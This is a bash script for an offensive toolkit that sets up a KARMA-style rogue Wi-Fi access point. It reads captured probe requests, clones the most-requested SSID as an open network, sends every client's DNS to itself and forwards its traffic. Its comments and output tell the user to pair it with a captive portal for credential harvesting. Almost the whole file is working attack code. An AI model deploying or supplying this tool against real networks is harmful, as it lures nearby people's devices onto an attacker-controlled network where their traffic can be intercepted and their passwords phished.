#!/bin/bash
set -euo pipefail
# /usr/local/bin/wifi-karma-ap
# KARMA AP — clone the most-probed SSID to lure clients
# Ported from Raspyjack karma_ap.py (7h30th3r0n3) for ZERO-DAY OS arm64
#
# Reads probes from wifi-probe-dump output, picks the top-requested SSID,
# and spins up a rogue AP using hostapd + dnsmasq.
# Pairs with captive-portal for credential harvesting.
#
# Usage: wifi-karma-ap [ap_iface] [inet_iface] [ssid]
#   ap_iface   — AP interface for rogue AP (default: wlan1, dongle)
#   inet_iface — Internet-facing iface for forwarding (default: wlan0)
#   ssid       — SSID to clone; 'auto' reads latest probe dump (default: auto)
#
# Deps: hostapd dnsmasq — apt install hostapd dnsmasq

AP_IFACE="${1:-wlan1}"
INET_IFACE="${2:-wlan0}"
SSID_ARG="${3:-auto}"
LOOT="/opt/cardputer/loot/wifi"
TMP="/tmp/zd-karma"
mkdir -p "$TMP"

RED='\033[0;31m'; CYAN='\033[0;36m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; BOLD='\033[1m'; NC='\033[0m'

info() { echo -e "${CYAN}[*]${NC} $*"; }
ok()   { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*"; exit 1; }

[ "$(id -u)" -ne 0 ] && err "Root required."
command -v hostapd  &>/dev/null || err "hostapd not found — apt install hostapd"
command -v dnsmasq  &>/dev/null || err "dnsmasq not found — apt install dnsmasq"
ip link show "$AP_IFACE"   &>/dev/null || err "$AP_IFACE not found (connect RTL8821CU dongle)"

# Resolve SSID
if [ "$SSID_ARG" = "auto" ]; then
    # Find most-probed SSID from latest probe dump JSON
    LATEST_JSON=$(ls -t "$LOOT"/probes_*.json 2>/dev/null | head -1)
    if [ -n "$LATEST_JSON" ]; then
        SSID=$(python3 -c "
import json, collections
data = json.load(open('$LATEST_JSON'))
counts = collections.Counter(s for ssids in data.values() for s in ssids
                              if s != '<broadcast>')
if counts:
    ssid, n = counts.most_common(1)[0]
    print(ssid)
    import sys; print(f'(probed {n}x by {len(data)} devices)', file=sys.stderr)
" 2>/tmp/zd-karma-ssid-info || true)
        [ -n "$SSID" ] || err "No probed SSIDs found. Run wifi-probe-dump first."
        info "Auto-selected SSID: '$SSID'  $(cat /tmp/zd-karma-ssid-info 2>/dev/null || true)"
    else
        err "No probe dump found. Run wifi-probe-dump first, or pass SSID manually."
    fi
else
    SSID="$SSID_ARG"
fi

echo ""
echo -e "${BOLD}${CYAN}━━━ KARMA AP — ZERO-DAY OS ━━━${NC}"
info "AP Interface: $AP_IFACE"
info "SSID (target): $SSID"
info "Internet via:  $INET_IFACE"
echo ""
echo -n "Launch rogue AP as '$SSID'? [y/N]: "
read -r confirm
[ "${confirm,,}" = "y" ] || { info "Aborted."; exit 0; }

# Pick first free channel (1, 6, or 11)
get_free_channel() {
    for ch in 1 6 11; do
        # Check if channel is congested (>3 APs on it from last scan)
        n=$(grep -r "channel $ch" "$LOOT"/*.log 2>/dev/null | wc -l || echo 0)
        [ "$n" -lt 3 ] && { echo "$ch"; return; }
    done
    echo "6"
}
CHANNEL=$(get_free_channel)
AP_IP="10.0.0.1"
DHCP_RANGE="10.0.0.10,10.0.0.100"

# Write hostapd config
cat > "$TMP/hostapd.conf" << HOSTAPDEOF
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
wmm_enabled=0
macaddr_acl=0
# Open network — no password (matches probed AP, so clients auto-connect)
HOSTAPDEOF

# Write dnsmasq config
cat > "$TMP/dnsmasq.conf" << DNSMASQEOF
interface=$AP_IFACE
bind-interfaces
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
address=/#/$AP_IP
log-queries
log-dhcp
DNSMASQEOF

cleanup() {
    info "Stopping KARMA AP..."
    kill "$HOSTAPD_PID" 2>/dev/null || true
    kill "$DNSMASQ_PID" 2>/dev/null || true
    # Remove IP and iptables rules
    ip addr del "${AP_IP}/24" dev "$AP_IFACE" 2>/dev/null || true
    iptables -t nat -D POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null || true
    iptables -D FORWARD -i "$AP_IFACE" -j ACCEPT 2>/dev/null || true
    ip link set "$AP_IFACE" down 2>/dev/null || true
    iw dev "$AP_IFACE" set type managed 2>/dev/null || true
    ip link set "$AP_IFACE" up 2>/dev/null || true
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
}
trap cleanup EXIT

# Bring up AP interface
ip link set "$AP_IFACE" down 2>/dev/null
iw dev "$AP_IFACE" set type managed 2>/dev/null || true
ip link set "$AP_IFACE" up 2>/dev/null
ip addr flush dev "$AP_IFACE" 2>/dev/null || true
ip addr add "${AP_IP}/24" dev "$AP_IFACE"

# NAT forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null || true
iptables -A FORWARD -i "$AP_IFACE" -j ACCEPT 2>/dev/null || true

# Start hostapd
hostapd "$TMP/hostapd.conf" -B -P "$TMP/hostapd.pid" >/dev/null 2>&1 \
    && HOSTAPD_PID=$(cat "$TMP/hostapd.pid") \
    || err "hostapd failed to start. Check $AP_IFACE supports AP mode."

sleep 1

# Start dnsmasq
dnsmasq -C "$TMP/dnsmasq.conf" --pid-file="$TMP/dnsmasq.pid" 2>/dev/null \
    && DNSMASQ_PID=$(cat "$TMP/dnsmasq.pid") \
    || { warn "dnsmasq failed — clients will get no DHCP"; DNSMASQ_PID=0; }

ok "KARMA AP running: SSID='$SSID'  IP:$AP_IP  CH:$CHANNEL"
info "Clients connecting will get IP in $DHCP_RANGE"
info "All DNS resolves → $AP_IP (redirect everything)"
echo ""
info "Pair with captive-portal for credential harvesting:"
info "  captive-portal start $AP_IFACE $INET_IFACE '$SSID' wifi"
echo ""
warn "Press Ctrl+C to stop"

# Watch for connected clients
while true; do
    CLIENTS=$(cat /proc/net/arp 2>/dev/null | awk 'NR>1 && $1 ~ /^10\.0\.0/ && $3 == "0x2" {print $1, $4}' | head -10)
    if [ -n "$CLIENTS" ]; then
        echo -e "\r${GREEN}[+] Connected clients:${NC}"
        echo "$CLIENTS" | while read -r ip mac; do
            printf "    %-16s  %s\n" "$ip" "$mac"
        done
    fi
    sleep 5
done
